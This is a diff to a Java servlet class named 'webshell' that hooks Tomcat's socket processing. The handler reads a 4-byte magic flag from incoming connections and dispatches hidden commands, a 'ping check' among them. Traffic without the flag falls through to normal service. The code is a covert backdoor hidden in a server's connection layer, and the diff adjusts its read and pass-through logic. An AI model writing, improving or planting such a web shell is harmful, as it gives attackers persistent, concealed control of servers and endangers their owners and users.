@@ -60,19 +60,19 @@ public class webshell extends HttpServlet {
                         public AbstractEndpoint.Handler.SocketState process(SocketWrapperBase<?> socketWrapper,
                                                                             SocketEvent status) throws IOException {
                             if (status == SocketEvent.OPEN_READ) {
-                                ByteBuffer buffer = ByteBuffer.allocate(0);
-                                socketWrapper.read(false, buffer);
+                                ByteBuffer buffer = ByteBuffer.allocate(4);
+//                                socketWrapper.read(false, buffer);
                                 ByteBuffer readBuffer = socketWrapper.getSocketBufferHandler().getReadBuffer();
                                 // WebShell的flag
-                                byte[] bytes = new byte[4];
-                                if (readBuffer.remaining() < 4) {
+                                int read = socketWrapper.read(true, buffer);
+                                if (read < 4) {
+                                    readBuffer.position(0);
                                     return super.process(socketWrapper, status);
                                 }
-                                readBuffer.get(bytes, 0, 4);
-                                if (!tlv.validate(bytes)) {
-                                    return super.process(socketWrapper, status);
+                                if (!tlv.validate(buffer.array())) {
+                                    readBuffer.position(0);
+                                    return service(socketWrapper);
                                 }
-                                readBuffer.position(4);
                                 // 获取长度
                                 switch (readBuffer.get()) {
                                     // 执行ping检测
@@ -128,7 +128,7 @@ public class webshell extends HttpServlet {
                                         }
                                         break;
                                     default:
-                                        return super.process(socketWrapper, status);
+                                        return service(socketWrapper);
                                 }
                                 // SocketBufferHandler socketBufferHandler =
                                 // socketWrapper.getSocketBufferHandler();
@@ -136,7 +136,7 @@ public class webshell extends HttpServlet {
                                 // ByteBuffer readBuffer = socketBufferHandler.getReadBuffer();
                                 // ByteBuffer readBuffer1 = readBuffer;
                             }
-                            return super.process(socketWrapper, status);
+                            return service(socketWrapper);
                         }
                     };
                     http11Processor.setAdapter(adapter);
